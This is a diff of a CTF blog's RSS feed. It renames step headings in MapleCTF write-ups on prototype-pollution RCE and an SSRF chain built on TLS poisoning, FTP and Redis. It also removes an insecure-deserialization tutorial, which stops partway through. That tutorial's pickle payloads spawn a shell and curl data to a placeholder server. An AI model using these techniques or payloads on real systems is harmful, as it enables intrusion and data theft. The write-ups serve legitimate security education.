@@ -1,8 +1,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>Posts on Vie</title>
+        <title>Posts on VIE</title>
         <link>https://jamvie.net/posts/</link>
-        <description>Recent content in Posts on Vie</description>
+        <description>Recent content in Posts on VIE</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
@@ -10,7 +10,7 @@
         <atom:link href="https://jamvie.net/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>MapleCTF 2022: Vie&#39;s challenges</title>
+            <title>MapleCTF 2022    : Vie&#39;s challenges</title>
             <link>https://jamvie.net/posts/2022/09/maplectf-2022-vies-challenges/</link>
             <pubDate>Thu, 01 Sep 2022 14:50:08 -0600</pubDate>
             
@@ -21,7 +21,7 @@
 <p>Viene Library was a challenge I thought of using my &ldquo;flag first&rdquo; design template - where I think of the flag value and make a whole challenge around it. :&gt;</p>
 <p>I guess no one remembers vine anymore cause I don&rsquo;t think anyone remembered the references I put in? Especially the flag value, which was this <a href="https://www.youtube.com/watch?v=nSYiyg8LGzY">vine in particular (WARNING: profanity)</a>.</p>
 <p>Anyway, crisis and nostalgia aside, Viene Library was predicated on combining <em>my favourite bug</em> prototype pollution and some cute and quirky things about how HTTP Rails servers operate.</p>
-<h3 id="step-0-whats-in-the-code">Step 0: What&rsquo;s in the code?</h3>
+<h3 id="step-a-whats-in-the-code">Step A: What&rsquo;s in the code?</h3>
 <p>The public facing server was a NodeJS one that would call back to a Ruby Rails server asking for txt files served from the filesystem - these txt files were my vine poems, or my &ldquo;vienes&rdquo;. Both servers were in the same network in the same container. Only the NodeJS one was publicly accessible on port 8080.</p>
 <p><em>viene_controller.rb</em></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">VieneController</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ApplicationController</span>
@@ -114,11 +114,11 @@
 </span></span></code></pre></div><p>If you POST <code>/submitaviene</code> you could have your request body be standardized with <code>standardizeViene</code> which has a crystal clear proto pollution vulnerability. Keeping this in mind, we can take note of the fact that the server uses <a href="https://www.npmjs.com/package/node-fetch">node-fetch</a> to make requests back to the Rails server, and so our attack plan is formulated:</p>
 <pre tabindex="0"><code>1. Proto-pollute node-fetch to PUT to Rails server
 2. Ruby open() for RCE and get flog
-</code></pre><h3 id="step-1-proto-pollution-and-node-fetch">Step 1: Proto-pollution and node-fetch</h3>
+</code></pre><h3 id="step-b-proto-pollution-and-node-fetch">Step B: Proto-pollution and node-fetch</h3>
 <p><a href="https://portswigger.net/research/widespread-prototype-pollution-gadgets">Recent research</a> showcases that the object you pass into the fetch API can be proto-polluted with all the methods and fields you could stipulate to a fetch request (including node-fetch). For us, the ideal candidate here is the <code>headers</code> field, since the <code>method</code> field was explicitly declared in either node-fetch request so we couldn&rsquo;t proto-pollute that.</p>
 <p>The header I was thinking of was the <code>X-HTTP-Method-Override</code> header set to <code>PUT</code>, however I noticed some teams use <code>Content-Type</code> instead and set it to <code>application/x-www-form-urlencoded</code>, and adding <code>_method: PUT</code> in the form data to achieve the same effect.</p>
 <p>Either way, proto-polluting headers with either will make <a href="https://www.rubydoc.info/gems/rack/Rack/MethodOverride">Rails interpret the request</a> it recieves as a <code>PUT</code> instead of a <code>POST</code> regardless if whether or not the method field stated it was a <code>POST</code>.</p>
-<h3 id="step-2-ruby-open">Step 2: Ruby open()</h3>
+<h3 id="step-c-ruby-open">Step C: Ruby open()</h3>
 <p>Now that you&rsquo;re in the PUT logic of the viene controller in the Rails server, you get free RCE.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span>
@@ -145,7 +145,7 @@
 2. Use FTP server to SSRF an &#34;image file&#34; containing Redis commands to the Redis server via RESP
 3. &#34;image file&#34; overwrites a user&#39;s sessional key with a node-serialize payload which fires when user visits site
 4. flag
-</code></pre><h3 id="step-0-wtf-does-this-code-do">Step 0: WTF does this code do</h3>
+</code></pre><h3 id="step-a-wtf-does-this-code-do">Step A: WTF does this code do</h3>
 <p>The general idea of the app was as so:</p>
 <ul>
 <li>An image gallery that you could upload your own pictures to</li>
@@ -197,7 +197,7 @@
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>});
 </span></span></code></pre></div><p>Now, take note that the filename given to your image appends a <code>.png</code> extension to it (<code>random_filename</code>) - this does nothing as the extension and file format are never checked as valid. Therefore, you could submit a file of any format and it will not get type-checked as a legit PNG image.</p>
-<h3 id="step-1-tls-poison">Step 1: TLS Poison</h3>
+<h3 id="step-b-tls-poison">Step B: TLS Poison</h3>
 <p>The first step is the most tedious/hardest to work on. For those unaware, TLS poison is an innovative way to use TLS session ids or tickets to create powerful new SSRF techniques - <a href="https://www.youtube.com/watch?v=udpamSmD_vU&amp;ab_channel=BlackHat">here is the blackhat talk that discusses this in detail - thank you Joshua Maddux!</a>.</p>
 <p>The crux of the TLS poison is that the <a href="https://github.com/jmdx/TLS-poison">exploit server that is freely available out of the box</a> needed to be tweaked if you were to use it for the challenge. The jmdx TLS server would expect 2 requests to the DNS server, and it would alternate A records on each request, which is fine for most use cases <em>except</em> my challenge. See, the HTTP server makes a <em>curl</em> request to the specified resource:</p>
 <p><em>Entrypoint into TLS poison part</em></p>
@@ -220,16 +220,16 @@
 <pre tabindex="0"><code>[Random TLS stuff] \nUSER\nPASS\nPORT 127,0,0,1,24,235\nRETR &lt;userfilename&gt;
 </code></pre><p>The <code>PORT</code> command makes the server operate on active mode, establishing a data channel with localhost on port 6379 (where the Redis server is), which allows you to send a file of your choosing in the server&rsquo;s filesystem through that data channel.</p>
 <p>Anyway, bypass curl&rsquo;s caching and give the server a session ticket containing some FTP commands, leading to&hellip;</p>
-<h3 id="step-2-ftp-ssrf">Step 2: FTP SSRF</h3>
+<h3 id="step-c-ftp-ssrf">Step C: FTP SSRF</h3>
 <p>Remember the file format quirk?</p>
 <p>What we could do with it was upload a file which contained RESP commands that set the user&rsquo;s key to a node-serialize RCE payload, and have the FTP server RETR that file to Redis on active mode. We couldn&rsquo;t talk to the Redis server on our own, so let&rsquo;s use the FTP server to talk to it instead.</p>
 <p>Through TLS poisoning, you could submit a session ticket to the FTP server which would contain a bunch of FTP commands that should make the server operate on active mode, establish a data connection with the local Redis server on port 6379, and RETR the malicious &ldquo;image&rdquo; file to it.</p>
 <p>NOTE: The FTP server was intentionally made to be quiet even when recieving commands, as normal protocol involved it writing responses on input and it would try to do that into the SSL socket which caused problems.</p>
-<h3 id="step-3-redis-ssrf">Step 3: Redis SSRF</h3>
+<h3 id="step-d-redis-ssrf">Step D: Redis SSRF</h3>
 <p>Redis also uses a plaintext protocol, RESP, for data manipulation. When the FTP server establishes a data connection to the Redis one, the file it sends over should contain new-line delimited RESP commands which set a user&rsquo;s &ldquo;images&rdquo; key to that of a node-serialize payload.</p>
 <p>Your uploaded &lsquo;image&rsquo; file should have the following command inside:</p>
 <pre tabindex="0"><code>SET image_&lt;your art token&gt; &lt;node serialize payload&gt;
-</code></pre><h3 id="step-4-fleg">Step 4: Fleg</h3>
+</code></pre><h3 id="step-e-fleg">Step E: Fleg</h3>
 <p>When you revisit the art gallery, the app should deserialize your payload, netting you the flag.</p>
 <pre tabindex="0"><code>maple{M4N_I_L0V3_SSRFz_1N_My_SSRF5_In_my_556Fs}
 </code></pre><h3 id="notes">Notes</h3>
@@ -1106,31 +1106,6 @@ DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. E
         </item>
         
         <item>
-            <title>Commonly Used Software 2: Electric Boogaloo</title>
-            <link>https://jamvie.net/posts/2021/04/commonly-used-software-2-electric-boogaloo/</link>
-            <pubDate>Wed, 07 Apr 2021 23:10:50 -0600</pubDate>
-            
-            <guid>https://jamvie.net/posts/2021/04/commonly-used-software-2-electric-boogaloo/</guid>
-            <description>I figured I would make an update to this post from long ago, back when I first made this site. It&amp;rsquo;s kinda funny (and a lil cringy) to look back on it now given how I ended up completely deviating from that list and use an entirely new suite of tools. Actually, one year into CTFs and I&amp;rsquo;d consider my kit to be far smaller than it originally was. Funny how that works, no?</description>
-            <content type="html"><![CDATA[<p>I figured I would make an update to this <a href="/posts/2020/04/commonly-used-software/">post</a> from long ago, back when I first made this site. It&rsquo;s kinda funny (and a lil cringy) to look back on it now given how I ended up completely deviating from that list and use an entirely new suite of tools. Actually, one year into CTFs and I&rsquo;d consider my kit to be far smaller than it originally was. Funny how that works, no?</p>
-<p>The entire motive behind that post was to give a quick, general overview of the sorts of tools I felt like you should familarize yourself with to plunge into web exploits. This isn&rsquo;t to say that I no longer think that, the software available to us today is incredibly useful as an ethical hacker, but I felt this update important to subtly showcase my growth as a hacker through the tools I use (or don&rsquo;t use).</p>
-<p>Now, on to the new list.</p>
-<h2 id="1-ngrok">1. ngrok</h2>
-<p><em><a href="https://ngrok.com/">Link</a></em></p>
-<p>I love ngrok. It&rsquo;s easily my most utilized tool. It&rsquo;s great for literally anything, since at its core it&rsquo;s just a tunneler to expose a port on your localhost. Spin up a quick HTTP server and open ngrok on that same port, and now you have a public HTTP server. Start up a netcat listener and use ngrok on TCP mode, and now all you need is a reverse shell payload to be executed on some poor victim&rsquo;s server. The possibilities are endless.</p>
-<h2 id="2-python">2. Python</h2>
-<p><em><a href="https://www.python.org/">Link</a></em></p>
-<p>Can I call Python a tool? It&rsquo;s my scripting language of choice. One year ago, my Python skills were pretty barren (I was a staunch believer in C# supremacy. Microsoft, heyy) - now, most if not all of my coding (from scripts to full-fledged programs) are done in Python. It&rsquo;s remarkably easy to create anything with it. ALL of my ctf scripts are in Python, and most of my academic projects are also written in it. Not only that, but Python comes with an incredible library called <a href="https://github.com/Gallopsled/pwntools">pwntools</a> containing just about everything you could ever want in a CTF-centered package.</p>
-<hr>
-<p>Yea. That&rsquo;s it. I still use Wireshark and Burpsuite occasionally, and I naturally use the terminal for all CTFs so I can&rsquo;t escape CURL, but honestly analyzing my usage of tools I realized that I have seriously downsized. What does this mean for me?</p>
-<p>Well for one, I&rsquo;m <strong>not</strong> saying that the software outlined in my previous post are obsolete. They&rsquo;re most definitely not - Burpsuite, for example, is a powerful web pentesting tool with so much functionality that industry professionals use it today. Like I mentioned earlier, I still use Burpsuite, I just don&rsquo;t use it in the same way I did before. I found that earlier on in my CTF journey I relied on external tools a little <em>too</em> much to do the hard work, which isn&rsquo;t the most productive way to learn.</p>
-<p>Perhaps the biggest takeaway here is to acknowledge how much I have grown since even a year ago. There&rsquo;s a wealth of information about cybersecurity out there, constantly being added to and amended, and the process of learning never really &ldquo;completes&rdquo;. But, you can always take a look back and remark at how much you&rsquo;ve changed based on the little things that have adapted to accomodate your more experienced lifestyle. I thought that I needed several different tools to employ many different web-based exploits. Realistically, I wasn&rsquo;t using them in a productive manner - hoping that the software that I dumped the brunt work on would help me progress my own skills. What was I learning by allowing a script to automate the effort?</p>
-<p>The shrinking of this list is proof that I have become self-sufficient in the way of CTFs. Maybe more confident, too. I&rsquo;m happy that the progress is evident whenever I take a step back and look at how far I have come. A year&rsquo;s worth of progress can really be alot.</p>
-<p><strong>Vie</strong></p>
-]]></content>
-        </item>
-        
-        <item>
             <title>Bo1lersCTF 2021: Lorem_Ipsum</title>
             <link>https://jamvie.net/posts/2021/04/bo1lersctf-2021-lorem_ipsum/</link>
             <pubDate>Sun, 04 Apr 2021 03:12:16 -0600</pubDate>
@@ -1658,171 +1633,6 @@ I&amp;rsquo;m hesitant to attempt to nmap all known domains of justCatTheFish&am
 <p>So, all that&rsquo;s left is to craft a working payload. Due to the <code>/bugbounty.php</code> endpoint, we have a way to make the admin visit a URL we specify, so the rest of the problem is correctly formatting our XSS payload. I ended up hosting a page on my server to redirect the bot to the flag endpoint once they visited, and leak the contents of that response to a webhook. Unfortunately, I wasn&rsquo;t able to grab the flag in time before I could submit it - at that point, the CTF had ended :( I suppose next time I&rsquo;ll be more efficient given that I learned alot about PHP.</p>
 <hr>
 <p>And that&rsquo;s a portion of the challenges I took a look at during justCTF. Hopefully next time I can solve challenges more efficiently :P</p>
-<p><strong>Vie</strong></p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Common Web Exploits: A Guide for Recon</title>
-            <link>https://jamvie.net/posts/2021/01/common-web-exploits-a-guide-for-recon/</link>
-            <pubDate>Tue, 26 Jan 2021 12:04:52 -0700</pubDate>
-            
-            <guid>https://jamvie.net/posts/2021/01/common-web-exploits-a-guide-for-recon/</guid>
-            <description>This is mainly used as a helpful recon guide to determine what vulnerabilities are available to you as an ethical hacker or CTFer. I&amp;rsquo;ve spent quite a bit of time researching these vulnerabilities and spotting their telltale signs, and I hope to share them here. These are common or more unique vulnerabilities that I have seen, executed, and researched while doing CTFs.
-Disclaimer: This article is not exhaustive, and is not intended to replace any research you would perform on your own.</description>
-            <content type="html"><![CDATA[<p>This is mainly used as a helpful recon guide to determine what vulnerabilities are available to you as an ethical hacker or CTFer. I&rsquo;ve spent quite a bit of time researching these vulnerabilities and spotting their telltale signs, and I hope to share them here. These are common or more unique vulnerabilities that I have seen, executed, and researched while doing CTFs.</p>
-<p><em>Disclaimer</em>: This article is not exhaustive, and is not intended to replace any research you would perform on your own. I merely present this as a guide to help others understand how exploits work, based on my own experience in CTFs and my research.</p>
-<h2 id="cross-site-request-forgery-csrfcross-site-scripting-xss">Cross-Site Request Forgery (CSRF)/Cross-Site Scripting (XSS)</h2>
-<p>I group CSRF attacks and XSS attacks together because their attack delivery involves much of the same steps. CSRF attacks involve secretly invoking state-modifying requests, piggybacking on a victim&rsquo;s sessional cookies (without them knowing), while XSS attacks involve rogue Javascript injection into a webpage to perform a variety of things. However, both involve the presence of some &ldquo;victim&rdquo;, who would need to visit a webpage that we control.
-If you suspect one of these exploits is available to you, look for specific areas where <strong>user-input is accepted</strong>, and for webpages that <strong>can be seen by other users</strong>. If your application satisfies both of those conditions, you can format your recon accordingly to look for these xss/csrf bugs.</p>
-<h2 id="sql-injection">SQL Injection</h2>
-<p>SQL databases are used for many different purposes - and most commonly in CTFs, they&rsquo;re seen to authenticate users when logging in, or when searching through items displayed on a webpage (i.e you have a blog with a search function to look for a specific post).</p>
-<p>If you see a login function, you can try to see if SQL injection can be at play by injecting rogue quotes <code>'</code> in user input, or other SQL statements that could malform the underlying query in the backend (i.e <code>'; --</code> which comments out the rest of the query). Be warned that by default, SQL exception errors are <em>incredibly</em> verbose, and CTF competitions may surpress these error messages to prevent a dead giveaway. You&rsquo;ll typically want to log in as a privileged user, like <code>admin</code>.</p>
-<p>If you see a search function through a collection, such as a collection of blog posts, the search may be using an SQL query to filter and display the database table accordingly. In CTFs, there may be a specific tuple in that query that is of importance, and which wouldn&rsquo;t be seen by normal search terms. Injecting the appropriate queries in the search bar is just the same as when testing for SQLi in login functions - test if rogue quotes can be inserted, or portions of SQL characters that can malform the query underneath.</p>
-<h2 id="local-file-inclusiondirectory-traversal">Local File Inclusion/Directory Traversal</h2>
-<p>Most commonly seen in applications developed in PHP, file inclusion vulnerabilities are a bit tricky to see unless you have an idea of what the source code looks like.</p>
-<p>Anywhere that you can find a <code>$file = $_GET[‘file’];</code> in PHP can be a giveaway for LFI attacks (though be careful - while most LFI attacks I&rsquo;ve seen abuse PHP&rsquo;s <code>GET</code> module, not all LFI attacks will use it). In more straightforward challenges, the problem may specify a file or hidden webpage somewhere on the server that can&rsquo;t be accessed by a regular REST api, and so you may need to perform a directory traversal attack to move through the webserver&rsquo;s directory in search of it.</p>
-<h2 id="ssrf">SSRF</h2>
-<p>Also a trickier exploit to spot, SSRFs sort of look like CSRFs but instead of a user being tricked into making a request, a server is tricked. In simplistic challenges, I see this often as a website that checks URLs, so you input a URL and the site fires a GET request to it. SSRFs may require knowledge of the backend architecture to fully execute.
-Try and look for servers in an autonomous system that supports server intra-communication, and implements basic integrity checking (LAN checking, use of tokens, etc). See if there are any servers that are front-facing and can be communicated to.</p>
-<h2 id="xml-external-entity-xxe">XML External Entity (XXE)</h2>
-<p>XML parsers can be notoriously insecure, and a very prominent bug related to XML is external entity exploits - where you can specify the disclosure of sensitive files or the inclusion of malware in an XML file.</p>
-<p>Look for where XML files are accepted into the application. If at any point, you can provide a <code>.xml</code> file to the server, there may be a chance for xxe.</p>
-<h2 id="http-request-smuggling">HTTP Request Smuggling</h2>
-<p>While rare in CTFs, this is a unique bug that I wouldn&rsquo;t mind seeing more exposure of in hacking competitions. Request smuggling requires communication between 2 servers that will process the same request differently (request parsers are notoriously not standardized). In your requests, look for feedback or other hints that a proxy server is in use, which typically reads through your request before sending it to the proper server. Furthermore, check to see if the multiple servers handle requests differently based on the <code>Transfer-Encoding</code> header and the <code>Content-Length</code> header in their responses.</p>
-<h2 id="insecure-deserialization">Insecure Deserialization</h2>
-<p>Spotting deserialization bugs relies on the language used in implementing the application, as each language has a unique module or library for serialization purposes. If you have access to source code, look for known popular serial modules such as python&rsquo;s <code>pickle</code> module, javascript <code>javascript-serializer</code>, etc etc. If not modules, look for class specifications, such as Java&rsquo;s <code>serilizable.io</code> class, or functions like PHP&rsquo;s <code>serialize()</code>.</p>
-<p>Deserialization bugs also take advantage of user input, so examine where in applications user input may be converted to some byte format for easy transportation. Looking out for specific formats, like JSON when dealing with Javascript applications, are important to note to see if they get passed through a deserializer.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Insecure Deserialization: Introduction</title>
-            <link>https://jamvie.net/posts/2020/12/insecure-deserialization-introduction/</link>
-            <pubDate>Tue, 22 Dec 2020 14:38:40 -0700</pubDate>
-            
-            <guid>https://jamvie.net/posts/2020/12/insecure-deserialization-introduction/</guid>
-            <description>Insecure deserialization is a prolific vulnerability that provides a pretty straightforward gateway into unintended RCE - if you&amp;rsquo;re not careful. As of late, I&amp;rsquo;ve seen more and more CTFs employ this bug, and more real-word bug bounties deal with this kind of exploit. I figure I could provide a quick introduction into them, and hopefully ensure a few people secure their applications from this.
-Context What Even is Serialization? My CPSC210 class I learned the fundamentals of object-oriented programming and the concept of complex abstractions above simple data structures: From simple arrays to instances of objects or classes, with fields and properties holding specific type values.</description>
-            <content type="html"><![CDATA[<p>Insecure deserialization is a prolific vulnerability that provides a pretty straightforward gateway into unintended RCE - if you&rsquo;re not careful. As of late, I&rsquo;ve seen more and more CTFs employ this bug, and more real-word bug bounties deal with this kind of exploit. I figure I could provide a quick introduction into them, and hopefully ensure a few people secure their applications from this.</p>
-<h2 id="context">Context</h2>
-
-    <img src="/images/InsecureDeserializationIntro.jpg"  alt="intro"  class="center"  style="border-radius: 8px;"  />
-
-
-<h3 id="what-even-is-serialization">What Even is Serialization?</h3>
-<p>My CPSC210 class I learned the fundamentals of object-oriented programming and the concept of complex abstractions above simple data structures: From simple arrays to instances of objects or classes, with fields and properties holding specific type values. Classes and complex data structures are great and all, but how do you manage them in transit across the web? Can they even be efficiently and losslessly transfered between machines? Or maybe there&rsquo;s some sort of practise we can use to streamline this?</p>
-<p>The process of serialization seeks to simplify the concept - it&rsquo;s the act of taking any object and converting it into some workable format of a stream of bytes for ease of transfer and transition. It can be thought of as &ldquo;flattening&rdquo; said object and transferring that flattened version to wherever it needs to go. This &ldquo;flattened version&rdquo; could be anything from JSON data, XML, maybe just a bunch of bytes, or a specific string - it all depends on the language.</p>
-
-    <img src="/images/InsecureDeserializationIntro_Serial.jpg"  alt="Serial"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>Of course, the opposite process is called deserialization: taking that flattened byte stream and recreating a copy of the original object from it. It will reconstruct any properties, fields from the stream and hopefully present a working replica of the original.</p>
-
-    <img src="/images/InsecureDeserializationIntro_Deserial.jpg"  alt="secret"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>The serialization process is a key component to ensure that all the parts of a system are working together and seamlessly, operating in all sorts of different formats but still managing to easily convert data from some base byte stream into a workable object for their use. But it&rsquo;s not without its own flaws. In many cases, it&rsquo;s not totally lossless.</p>
-<h3 id="backup-directives">Backup Directives</h3>
-<p>When serializing objects, one thing to note is that some properties or connections will not completely transfer over during the process. In that case, there should be some sort of backup plan or emergency what-to-do in those situations. This blueprint will vary from language to language, but often you&rsquo;ll see it as some directive that tells the deserializer what to do when it encounters a foreign property. As an example, Python&rsquo;s <a href="https://docs.python.org/3/library/pickle.html">pickle</a> module - the native serializing library in Python - uses a magic function called <code>__reduce__()</code> to stipulate what should be done in case not everything was perfectly translated from their bytestream form.</p>
-<p><code>__reduce__()</code> in particular tells the pickle module how to handle things directly within the definition of the class. Specifying this interface will allow us to manually reconstruct potentially complicated properties, such as database connections or open file handles. Of course, there exist unintended ways of using the <code>__reduce__()</code> directive.</p>
-<h2 id="insecure-deserialization">Insecure Deserialization</h2>
-<p>Serialization is not inherently bad, and it&rsquo;s a very important tool in many infrastructures today. What makes it vulnerable is, like with many different practises, improper handling of its inputs. Insecure deserialization typically arises when applications feed user input into their deserializers, which wasn&rsquo;t properly cleaned/sanitized.</p>
-<p>Refer back to Python&rsquo;s pickle module once more. It uses the <code>__reduce__()</code> directive for edge cases where properties are not properly reconstructed from their stream form. However, if the input that you&rsquo;re giving your pickler is from some external user, you lay yourself bare for RCE.</p>
-<p><code>__reduce__()</code> can be used to stipulate potentially dangerous commands, such as opening a reverse shell to a server you control. This is, unfortunately, necessary functionality for the pickle module to have in order to operate smoothly. Consider the following example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DontDoThis</span>(object):
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, ))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>EvilExample <span style="color:#f92672">=</span> DontDoThis()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>pickle<span style="color:#f92672">.</span>dump(EvilExample, open(<span style="color:#e6db74">&#34;save.p&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>my_data <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>load(open(<span style="color:#e6db74">&#34;save.p&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>))
-</span></span></code></pre></div><p>Observe that this script will deserialize an instance of <code>DontDoThis</code>, and will come across the <code>__reduce()__</code> method. It will then do whatever <code>__reduce()__</code> tells it to do, which is to open an <code>sh</code> shell.</p>
-<p>Let&rsquo;s see another example:</p>
-<p><em>(Some parts omitted)</em></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, redirect, url_for
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> werkzeug.utils <span style="color:#f92672">import</span> secure_filename
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>UPLOAD_FOLDER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/directory/to/webserver&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>] <span style="color:#f92672">=</span> UPLOAD_FOLDER
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">notes_post</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!doctype HTML&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;title&gt;Upload new File&lt;/title&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;h1&gt;Upload new File&lt;/h1&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;form method=post enctype=multipart/form-data&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;input type=file name=file&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;input type=submit value=Upload&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/form&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        filename <span style="color:#f92672">=</span> secure_filename(file<span style="color:#f92672">.</span>filename)
-</span></span><span style="display:flex;"><span>        file<span style="color:#f92672">.</span>save(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span>], filename))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;thaaanks!&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;filename&gt;&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">note</span>():
-</span></span><span style="display:flex;"><span>    my_data <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>load(filename, <span style="color:#e6db74">&#34;rb&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;your file was succesfully deserialized~&#34;</span>
-</span></span></code></pre></div><p>I made this toy application to explain this process. The expected application flow is that our program is going to take a file defined by the user and store it in the webserver. For ease of use and convenience, the application <em>assumes</em> that the files provided by the user are able to be deserialized. You can request for an object back, and when you do so, it gets deserialized.</p>
-
-    <img src="/images/InsecureDeserializationIntro_fileUpload.png"  alt="secret"  class="center"  style="border-radius: 8px;"  />
-
-
-<p>So, the expected input is any sort of user-provided file. What happens when we provide it a file generated from this script?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hello</span>(object):
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#34;curl http://your.server.HERE --data </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">hello</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, ))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>EvilExample <span style="color:#f92672">=</span> Hello()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>pickle<span style="color:#f92672">.</span>dump(EvilExample, open(<span style="color:#e6db74">&#34;hello.p&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>))
-</span></span></code></pre></div><p>If you&rsquo;re this far into the blog post, you probably already have a good idea of what could happen to our program. The file we create, <code>hello.p</code>, will get serialized, but as soon as we request for it&hellip;</p>
-
-    <img src="/images/InsecureDeserializationIntro_hello.png"  alt="hello"  class="center"  style="border-radius: 8px;"  />
-
-
